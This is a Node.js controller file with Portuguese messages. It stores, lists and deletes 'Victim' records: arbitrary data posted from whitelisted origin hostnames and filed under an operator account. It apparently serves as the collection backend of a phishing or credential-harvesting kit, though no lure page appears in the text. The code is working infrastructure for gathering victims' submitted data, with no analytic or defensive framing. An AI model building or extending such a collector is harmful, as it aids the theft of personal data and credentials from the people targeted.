const Victim = require("../models/Victim");
const status = require("../../functions/status");
const UserController = require("./UserController");
const getHostname = require("../../functions/getHostname");
const user = new UserController();

module.exports = class VictimController {
    async delete(id) {
        const result = await Victim.deleteOne({
            id,
        });

        if (result.deletedCount > 0) {
            return {
                status: 200,
                message: "Vítima excluida com sucesso!",
            };
        } else {
            return status.server_error;
        }
    }

    async GetAll(owner) {
        const victims = await Victim.find({
            owner,
        });

        try {
            if (victims.length > 0) {
                return {
                    status: 200,
                    victims,
                };
            } else {
                return {
                    status: 200,
                    victims: [],
                };
            }
        } catch {
            return status.server_error;
        }
    }

    async Create(owner, data, url) {
        function isEmpty(obj) {
            try {
                for (var prop in obj) {
                    if (obj.hasOwnProperty(prop)) return false;
                }
                return JSON.stringify(obj) === JSON.stringify({});
            } catch {
                return true;
            }
        }

        if (await isEmpty(data)) {
            console.log("vazio 1");
            return status.fill_all_fields;
        }

        const userData = await user.get({
            username: owner,
        });

        const allowedOrigins = userData.allowedOrigins || [];
        console.log("url: " + url);
        const hostname = getHostname(url);
        console.log("hostname: " + hostname);
        if (!allowedOrigins.find((o) => o.hostname == hostname)) {
            return {
                status: 403,
                error: "Esta origem não tem permissão para fazer isso.",
            };
        }

        function genRandNumber() {
            return Math.floor(Math.random() * 999999);
        }

        const newId =
            "t" +
            genRandNumber() +
            "d" +
            genRandNumber() +
            "7" +
            genRandNumber();

        const newVictim = new Victim({
            id: newId,
            owner,
            data: data ? data : "",
            url,
        });

        try {
            const result = await newVictim.save();
            return {
                status: 200,
                message: "Dados salvos com êxito!",
                db: result,
            };
        } catch {
            return status.server_error;
        }
    }
};
